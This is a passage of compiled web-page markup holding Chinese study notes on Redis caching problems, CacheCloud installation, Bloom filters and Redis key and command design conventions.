\"),t(\"h4\",{attrs:{id:\"如何发现\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#如何发现\"}},[s._v(\"#\")]),s._v(\" 如何发现\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"业务的响应时间\")]),s._v(\" \"),t(\"li\",[s._v(\"业务本身问题\")]),s._v(\" \"),t(\"li\",[s._v(\"相关指标：总调用数、缓存层命中数、存储层命中数\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"解决方法\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#解决方法\"}},[s._v(\"#\")]),s._v(\" 解决方法\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"缓存空对象\")]),s._v(\" \"),t(\"li\",[s._v(\"布隆过滤器拦截\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"缓存雪崩\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#缓存雪崩\"}},[s._v(\"#\")]),s._v(\" 缓存雪崩\")]),s._v(\" \"),t(\"p\",[s._v(\"由于 cache 服务承载大量请求，当 cache 服务异常/脱机，流量直接压向后端组件(例如 DB)，造成级联故障\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"优化方案\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#优化方案\"}},[s._v(\"#\")]),s._v(\" 优化方案\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"保证缓存高可用性\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"个别节点、个别机器、甚至是机房\")]),s._v(\" \"),t(\"li\",[s._v(\"例如 Redis Cluster、Redis Sentinel、VIP\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"依赖隔离组件为后端限流\")]),s._v(\" \"),t(\"li\",[s._v(\"提前演练：例如压力测试\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"无底洞问题\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#无底洞问题\"}},[s._v(\"#\")]),s._v(\" 无底洞问题\")]),s._v(\" \"),t(\"p\",[s._v(\"参考：\"),t(\"a\",{attrs:{href:\"http://highscalability.com/blog/2009/10/26/facebooks-memcached-multiget-hole-more-machines-more-capacit.html\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"http://highscalability.com/blog/2009/10/26/facebooks-memcached-multiget-hole-more-machines-more-capacit.html\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"更多的机器 更多的性能\")]),s._v(\" \"),t(\"li\",[s._v(\"批量接口需求(mget,mset 等)\")]),s._v(\" \"),t(\"li\",[s._v(\"数据增长与水平扩展需求\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"优化-io\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#优化-io\"}},[s._v(\"#\")]),s._v(\" 优化 IO\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"命令本身优化：例如慢查询 keys、hgetall bigkey\")]),s._v(\" \"),t(\"li\",[s._v(\"减少网络通信次数\")]),s._v(\" \"),t(\"li\",[s._v(\"降低接入成本：例如客户端长连接/连接池、NIO 等\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"热点-key-的重建优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#热点-key-的重建优化\"}},[s._v(\"#\")]),s._v(\" 热点 key 的重建优化\")]),s._v(\" \"),t(\"p\",[s._v(\"热点 key + 较长的重建时间\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"减少缓存重建的次数\")]),s._v(\" \"),t(\"li\",[s._v(\"数据尽可能一致\")]),s._v(\" \"),t(\"li\",[s._v(\"减少潜在风险\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"解决方案\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#解决方案\"}},[s._v(\"#\")]),s._v(\" 解决方案\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"互斥锁(mutex key)\")]),s._v(\" \"),t(\"li\",[s._v(\"永远不过期\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"cachecloud\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#cachecloud\"}},[s._v(\"#\")]),s._v(\" CacheCloud\")]),s._v(\" \"),t(\"p\",[s._v(\"CacheCloud 提供一个 Redis 云管理平台：实现多种类型(Redis Standalone、Redis Sentinel、Redis Cluster)自动部署、解决 Redis 实例碎片化现象、提供完善统计、监控、运维功能、减少运维成本和误操作，提高机器的利用率，提供灵活的伸缩性，提供方便的接入客户端。\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"安装-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#安装-2\"}},[s._v(\"#\")]),s._v(\" 安装\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"参考：https-github-com-sohutv-cachecloud-wiki-3-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-ab-af-e6-8e-a5-e5-85-a5-e6-96-87-e6-a1-a3\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#参考：https-github-com-sohutv-cachecloud-wiki-3-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-ab-af-e6-8e-a5-e5-85-a5-e6-96-87-e6-a1-a3\"}},[s._v(\"#\")]),s._v(\" 参考：\"),t(\"a\",{attrs:{href:\"https://github.com/sohutv/cachecloud/wiki/3.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%8E%A5%E5%85%A5%E6%96%87%E6%A1%A3\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://github.com/sohutv/cachecloud/wiki/3.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%8E%A5%E5%85%A5%E6%96%87%E6%A1%A3\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#下载项目\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /opt\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"git\")]),s._v(\" clone https://github.com/sohutv/cachecloud.git\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#导入数据库\")]),s._v(\"\\nmysql -uroot -p\\ncreate database cachecloud\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\";\")]),s._v(\"\\nuse cachecloud\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\";\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"source\")]),s._v(\" /opt/cachecloud/script/cachecloud.sql\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#本地 修改配置文件local.properties\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"vim\")]),s._v(\" /opt/cachecloud/cachecloud-open-web/src/main/swap/local.properties\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#生产环境 修改配置文件online.properties\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"vim\")]),s._v(\" /opt/cachecloud/cachecloud-open-web/src/main/swap/online.properties\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#本地启动\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#在cachecloud根目录下运行\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /opt/cachecloud\\nmvn clean compile \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" -Plocal\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#在cachecloud-open-web模块下运行\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /opt/cachecloud/cachecloud-open-web\\nmvn spring-boot:run\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#生产环境启动\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#在cachecloud根目录下运行\")]),s._v(\"\\nmvn clean compile \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" -Ponline\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#拷贝war包(cachecloud-open-web/target/cachecloud-open-web-1.0-SNAPSHOT.war)到/opt/cachecloud-web下\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"mkdir\")]),s._v(\" /opt/cachecloud-web\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" /opt/cachecloud/cachecloud-open-web/target/cachecloud-open-web-1.0-SNAPSHOT.war /opt/cachecloud-web/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#拷贝配置文件(cachecloud-open-web/src/main/resources/cachecloud-web.conf)到/opt/cachecloud-web下，并改名为cachecloud-open-web-1.0-SNAPSHOT.conf（spring-boot要求，否则配置不生效）\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" /opt/cachecloud/cachecloud-open-web/src/main/resources/cachecloud-web.conf /opt/cachecloud-web/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /opt/cachecloud-web/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"mv\")]),s._v(\" cachecloud-web.conf cachecloud-open-web-1.0-SNAPSHOT.conf\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#启动方法1(作为系统服务启动，可能存在系统兼容性问题，目前redhat6.5,centos7正常)\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sudo\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ln\")]),s._v(\" -s /opt/cachecloud-web/cachecloud-open-web-1.0-SNAPSHOT.war /etc/init.d/cachecloud-web\\n/etc/init.d/cachecloud-web start\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#启动方法2(使用脚本启动，大部分操作系统都正常) 拷贝启动脚本(cachecloud根目录下script目录下的start.sh和stop.sh)到/opt/cachecloud-web下\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" /opt/cachecloud/script/start.sh /opt/cachecloud-web/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" /opt/cachecloud/script/stop.sh /opt/cachecloud-web/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sh\")]),s._v(\" start.sh \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#如果机器内存不足，可以适当调小:-Xmx和-Xms(默认是4g)\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sh\")]),s._v(\" stop.sh\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"29\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"30\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"31\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"32\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"33\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"34\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"35\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"36\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"37\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"38\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"39\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"40\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"41\")]),t(\"br\")])]),t(\"p\",[s._v(\"local.properties 和 online.properties 属性配置\")]),s._v(\" \"),t(\"table\",[t(\"thead\",[t(\"tr\",[t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"属性名\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"说明\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"示例\")])])]),s._v(\" \"),t(\"tbody\",[t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"cachecloud.db.url\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"mysql 驱动 url\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"jdbc:mysql://127.0.0.1:3306/cache-cloud\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"cachecloud.db.user\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"mysql 用户名\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"admin\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"cachecloud.db.password\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"mysql 密码\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"admin\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"web.port\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"spring-boot 内嵌 tomcat 启动端口\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"启动端口 测试 9999,线上 8585(可修改)\")])])])]),s._v(\" \"),t(\"p\",[s._v(\"http://127.0.0.1:9999/manage/login 使用用户名:admin、密码:admin 访问系统\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"配置-4\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#配置-4\"}},[s._v(\"#\")]),s._v(\" 配置\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"添加机器\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#用户名cachecloud和密码cachecloud要跟配置修改中的保持一样\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /opt/cachecloud/script\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sh\")]),s._v(\" cachecloud-init.sh cachecloud\\ncachecloud\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"p\",[s._v(\"进入后台管理，点击机器管理，添加新机器\")]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"添加应用\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"布隆过滤器\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#布隆过滤器\"}},[s._v(\"#\")]),s._v(\" 布隆过滤器\")]),s._v(\" \"),t(\"p\",[s._v(\"实现原理：一个很长的二进制向量和若干个哈希函数\\n参数：m 个二进制向量，n 个预备数据，k 个哈希函数\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"误差率\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#误差率\"}},[s._v(\"#\")]),s._v(\" 误差率\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"肯定存在误差：恰好都命中了\")]),s._v(\" \"),t(\"li\",[s._v(\"直观因素：m/n 的比率，hash 函数的个数\")]),s._v(\" \"),t(\"li\",[s._v(\"m/n 与误差率成反比，k 与误差率成反比\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"本地布隆过滤器\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#本地布隆过滤器\"}},[s._v(\"#\")]),s._v(\" 本地布隆过滤器\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"现有库：guava\")])]),s._v(\" \"),t(\"p\",[s._v(\"参考：\"),t(\"a\",{attrs:{href:\"http://ifeve.com/google-guava-hashing\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"http://ifeve.com/google-guava-hashing\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"本地布隆过滤器的问题：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"容量受限制\")]),s._v(\" \"),t(\"li\",[s._v(\"多个应用存在多个布隆过滤器，构建同步复杂\")])])])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"redis-布隆过滤器\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-布隆过滤器\"}},[s._v(\"#\")]),s._v(\" Redis 布隆过滤器\")]),s._v(\" \"),t(\"p\",[s._v(\"基于位图实现\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"实现方法\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#实现方法\"}},[s._v(\"#\")]),s._v(\" 实现方法\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"定义布隆过滤器构造参数：m、n、k、误差率\")]),s._v(\" \"),t(\"li\",[s._v(\"定义布隆过滤器操作函数：add 和 contain\")]),s._v(\" \"),t(\"li\",[s._v(\"封装 Redis 位图操作\")]),s._v(\" \"),t(\"li\",[s._v(\"开发测试样例\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"基于-redis-单机实现存在的问题\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#基于-redis-单机实现存在的问题\"}},[s._v(\"#\")]),s._v(\" 基于 Redis 单机实现存在的问题\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"速度慢：比本地慢，输出网络\\n\"),t(\"ul\",[t(\"li\",[s._v(\"解决：单独部署，与应用同机房甚至机架部署\")])])]),s._v(\" \"),t(\"li\",[s._v(\"容量受限：Redis 最大字符串为 512MB、Redis 单机容量\\n\"),t(\"ul\",[t(\"li\",[s._v(\"解决：基于 Redis Cluster 实现\")])])])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"redis-分布式布隆过滤器\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-分布式布隆过滤器\"}},[s._v(\"#\")]),s._v(\" Redis 分布式布隆过滤器\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"多个布隆过滤器：二次路由\")]),s._v(\" \"),t(\"li\",[s._v(\"基于 Pipeline 提高效率\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"开发规范\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#开发规范\"}},[s._v(\"#\")]),s._v(\" 开发规范\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"键值设计\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#键值设计\"}},[s._v(\"#\")]),s._v(\" 键值设计\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"key-设计\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#key-设计\"}},[s._v(\"#\")]),s._v(\" key 设计\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"可读性和可管理性：以业务名(或数据库名)为前缀(防止 key 冲突)，用冒号分割，比如业务名:表名:id,如：ugc:video:1\")]),s._v(\" \"),t(\"li\",[s._v(\"简洁性：保证语义的前提下，控制 key 的长度，当 key 较多，内存占用也不容忽视(redis3:39 字节 embstr)，如：user:{uid}:friends:messages:{mid}简化为 u:{uid}🇫🇷m:{mid}\")]),s._v(\" \"),t(\"li\",[s._v(\"不要包含特殊字符：反例：包含空格、换行、单双引号以及其他转义字符\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"value-设计\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#value-设计\"}},[s._v(\"#\")]),s._v(\" Value 设计\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"拒绝 bigkey\\n\"),t(\"ul\",[t(\"li\",[s._v(\"string 类型控制在 10KB 以内\")]),s._v(\" \"),t(\"li\",[s._v(\"hash、list、set、zset 元素个数不要超过 5000\")])])]),s._v(\" \"),t(\"li\",[s._v(\"选择合适的数据结构\")]),s._v(\" \"),t(\"li\",[s._v(\"过期设计\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"bigkey-危害\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#bigkey-危害\"}},[s._v(\"#\")]),s._v(\" bigkey 危害\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"网络阻塞\")]),s._v(\" \"),t(\"li\",[s._v(\"Redis 阻塞\")]),s._v(\" \"),t(\"li\",[s._v(\"集群节点数据不均衡\")]),s._v(\" \"),t(\"li\",[s._v(\"频繁序列化：应用服务器 CPU 消耗\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"bigkey-发现\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#bigkey-发现\"}},[s._v(\"#\")]),s._v(\" bigkey 发现\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"应用异常\")]),s._v(\" \"),t(\"li\",[t(\"code\",[s._v(\"redis-cli --bigkeys\")])]),s._v(\" \"),t(\"li\",[s._v(\"scan + debug object key\")]),s._v(\" \"),t(\"li\",[s._v(\"主动报警：网络流量监控、客户端监控\")]),s._v(\" \"),t(\"li\",[s._v(\"内核热点 key 问题优化\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"bigkey-删除\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#bigkey-删除\"}},[s._v(\"#\")]),s._v(\" bigkey 删除\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"阻塞：注意隐形删除(过期、rename 等)\")]),s._v(\" \"),t(\"li\",[s._v(\"Redis4.0：lazy delete(unlink 命令)\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"bigkey-预防\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#bigkey-预防\"}},[s._v(\"#\")]),s._v(\" bigkey 预防\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"优化数据结构：例如二级拆分\")]),s._v(\" \"),t(\"li\",[s._v(\"物理隔离或者万兆网卡：不是治标方案\")]),s._v(\" \"),t(\"li\",[s._v(\"命令优化：hgetall->hmget、hscan\")]),s._v(\" \"),t(\"li\",[s._v(\"报警和定期优化\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"键值生命周期\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#键值生命周期\"}},[s._v(\"#\")]),s._v(\" 键值生命周期\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"周期数据需要设置过期时间，\"),t(\"code\",[s._v(\"object idle time\")]),s._v(\"可以找垃圾 key-value\")]),s._v(\" \"),t(\"li\",[s._v(\"过期时间不宜集中：缓存穿透和雪崩等问题\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"命令优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#命令优化\"}},[s._v(\"#\")]),s._v(\" 命令优化\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"O(N)以上命令关注 N 的数量\")])]),s._v(\" \"),t(\"p\",[s._v(\"例如：hgetall、lrange、smembers、zrange、sinter 等并非不能使用，但是需要明确 N 的值。有遍历的需求可以使用 hscan、sscan、zscan 代替\")]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"禁用命令\")])]),s._v(\" \"),t(\"p\",[s._v(\"禁止线上使用 keys、flushall、flushdb 等，通过 redis 的 rename 机制禁掉命令，或者使用 scan 的方式渐进式处理\")]),s._v(\" \"),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"合理使用 select\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"redis 的多数据库较弱，使用数字进行区分\")]),s._v(\" \"),t(\"li\",[s._v(\"很多客户端支持较差\")]),s._v(\" \"),t(\"li\",[s._v(\"同时多业务用多数据库实际还是单线程处理，会有干扰\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"使用批量操作提高效率\")])]),s._v(\" \"),t(\"p\",[s._v(\"原生命令：例如 mget、mset\")]),s._v(\" \"),t(\"p\",[s._v(\"非原生命令：可以使用 pipeline 提高效率。 但要注意控制一次批量操作的元素个数(例如 500 以内，实际也和元素字节数有关)\")]),s._v(\" \"),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"注意两者不同：\")]),s._v(\" \"),t(\"p\",[s._v(\"原生是原子操作，pipeline 是非原子操作\")]),s._v(\" \"),t(\"p\",[s._v(\"pipeline 可以打包不同的命令，原生做不到\")]),s._v(\" \"),t(\"p\",[s._v(\"pipeline 需要客户端和服务端同时支持\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"5\"}},[t(\"li\",[s._v(\"Redis 事务功能较弱，不建议过多使用\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"Redis 的事务功能较弱(不支持回滚)\")]),s._v(\" \"),t(\"li\",[s._v(\"集群版本(自研和官方)要求一次事务操作的 key 必须在一个 slot 上(可以使用 hashtag 功能解决)\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"6\"}},[t(\"li\",[s._v(\"Redis 集群版本在使用 Lua 上有特殊要求\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"所有 key，必须在 1 个 slot 上，否则直接返回 error\")]),s._v(\" \"),t(\"li\",[s._v('\"-ERR eval/evalsha command keys must in same 